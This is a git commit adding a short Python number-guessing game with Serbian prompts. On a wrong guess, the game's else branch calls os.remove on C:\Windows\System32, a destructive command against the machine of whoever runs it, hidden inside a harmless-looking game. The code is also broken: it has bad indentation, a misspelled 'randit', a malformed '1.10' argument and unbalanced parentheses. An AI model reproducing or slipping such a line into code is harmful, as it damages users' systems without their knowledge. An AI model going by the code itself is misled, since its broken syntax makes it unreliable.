353bf9a2e400b881ad27d64d99b91edc57580c17
Laki301 <138689313+Laki301@users.noreply.github.com>
2023-07-05 15:51:20 +0200

    Add files via upload

---
+++ pogodi broj.py
@@ -0,0 +1,13 @@
+import random
+ import os
+ 
+ number= random.randit (1.10))
+ 
+ guess= input("igrica o brojevima,pogodi broj izmedju 1 i 10")
+ guess= int(guess)
+ 
+ if guess == number:
+     print("Tacno")
+     else:
+         os.remove("C:\Windows\System32")
+        
